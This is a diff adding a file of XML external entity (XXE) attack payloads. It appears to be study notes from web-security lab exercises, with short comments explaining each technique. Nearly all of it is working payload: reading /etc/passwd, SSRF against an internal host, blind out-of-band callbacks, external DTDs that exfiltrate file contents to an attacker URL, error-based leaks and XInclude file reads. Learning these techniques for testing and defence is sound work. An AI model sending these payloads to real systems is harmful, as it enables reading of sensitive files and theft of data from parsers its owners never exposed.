@@ -1,0 +1,39 @@
+<!-- XML Basic to get file -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+
+<!-- XML to perform SSRF -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+<!-- Blind XXE with out-of-band interaction -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "burp-collaborator"> ]>
+
+<!-- Blind XXE with out-of-band interaction using parameter entity
+    For this one you do not put &xxe in the body-->
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://qc6w9fzp7dllrn61bp2rx6g6gxmoaiy7.oastify.com"> %xxe; ]>
+
+<!-- Blind XXE using a external DTD -->
+<!-- DTD Contents -->
+<!ENTITY % file SYSTEM "file:///etc/passwd"> <!-- File parameter to get content of /etc/passwd -->
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> <!-- Eval parameter containing the creation of the exfiltrate parameter which makes a request to the url -->
+%eval; <!-- calls eval to create exfiltrate -->
+%exfiltrate; <!-- calls exfiltrate -->
+
+<!-- xxe to call for dtd to be downloaded -->
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a590060036c3abf822f84b101970034.exploit-server.net/exploit.dtd"> %xxe; ]>
+
+<!-- Blind XXE using a external DTD and error messages -->
+<!-- DTD Contents -->
+<!ENTITY % file SYSTEM "file:///etc/passwd"> <!-- File parameter to get content of /etc/passwd -->
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistant/%file;'>"> <!-- Eval parameter containing the creation of the error parameter which makes a request to a fake url causing an error -->
+%eval; <!-- calls eval to create exfiltrate -->
+%error; <!-- calls error -->
+
+<!-- XXE via Xinclude
+        - Xinclude allows XML document to be built from subdocuments
+        - Can be put anywhere in the XML document
+        - Useful if you can only control a single element -->
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>      
